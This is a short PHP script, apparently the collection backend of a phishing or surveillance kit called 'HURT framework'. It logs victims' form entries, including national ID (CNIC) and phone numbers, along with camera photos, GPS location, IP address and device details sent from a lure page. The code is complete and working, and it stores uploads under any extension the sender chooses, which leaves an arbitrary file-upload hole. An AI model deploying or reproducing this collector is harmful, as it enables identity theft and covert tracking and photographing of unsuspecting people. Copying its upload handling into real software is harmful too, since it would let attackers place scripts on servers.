<?php
// webhook.php - Universal data collector for HURT framework
// Captures: form fields, camera photos, GPS, raw device info

if (!is_dir('captures')) {
    mkdir('captures', 0755, true);
}

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

function logToFile($msg) {
    file_put_contents('data.txt', $msg . "\n", FILE_APPEND);
}

// 1. Handle file uploads (camera photos)
if (!empty($_FILES)) {
    $log = "\n═══════════════════════════════════\n";
    $log .= "📸 CAMERA PHOTOS\n";
    $log .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $log .= "IP: $ip\n";
    $log .= "User-Agent: $ua\n";
    foreach ($_FILES as $key => $file) {
        if ($file['error'] === UPLOAD_ERR_OK) {
            $ext = pathinfo($file['name'], PATHINFO_EXTENSION);
            $newName = 'captures/' . date('Ymd_His') . '_' . bin2hex(random_bytes(4)) . '.' . $ext;
            if (move_uploaded_file($file['tmp_name'], $newName)) {
                $log .= "Saved: $newName\n";
            }
        }
    }
    if (isset($_POST['gps'])) {
        $log .= "GPS Data: " . $_POST['gps'] . "\n";
    }
    logToFile($log);
    echo 'OK';
    exit;
}

// 2. Handle form submissions (POST fields like cnic, phone, etc.)
if (!empty($_POST)) {
    $log = "\n═══════════════════════════════════\n";
    $log .= "📥 FORM DATA\n";
    $log .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $log .= "IP: $ip\n";
    $log .= "User-Agent: $ua\n";
    foreach ($_POST as $key => $value) {
        $log .= "$key: $value\n";
    }
    $log .= "═══════════════════════════════════\n";
    logToFile($log);
    echo 'OK';
    exit;
}

// 3. Handle raw text (background payload)
$input = file_get_contents('php://input');
if ($input) {
    logToFile($input);
}
echo 'OK';
